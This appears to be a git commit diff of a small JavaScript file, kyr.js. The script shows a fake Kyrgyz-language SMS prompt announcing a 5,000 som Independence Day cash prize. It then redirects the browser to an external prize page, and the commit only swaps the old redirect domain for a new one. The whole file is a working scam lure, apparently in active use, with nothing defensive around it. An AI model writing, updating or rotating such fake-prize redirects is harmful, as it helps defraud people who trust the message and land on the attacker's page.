77a374435c69a9d7785beec996d86da2c4f71306
bveyoung <fog-value.1r@icloud.com>
2026-08-31 02:50:55 -1200

    Update kyr.js

--- kyr.js
+++ kyr.js
@@ -1,5 +1,5 @@
     var password = '5000 сом алыңыз'
 password=prompt('SMS: Куттуктайбыз, сиз Эгемендүүлүк күнүнө карата 5 000 өлчөмүндөгү акчалай сыйлыкты алууга укуктуусуз; сунушту алуу үчүн "OK" баскычын басыңыз.','5000 сом алыңыз');
 if (password != '5000 сом алыңыз') {
-location.href='https://www.usoromami.live/5000som-independence-day-cash';
+location.href='https://www.okponeyoung.fit/5000som-independence-day-cash';
 }
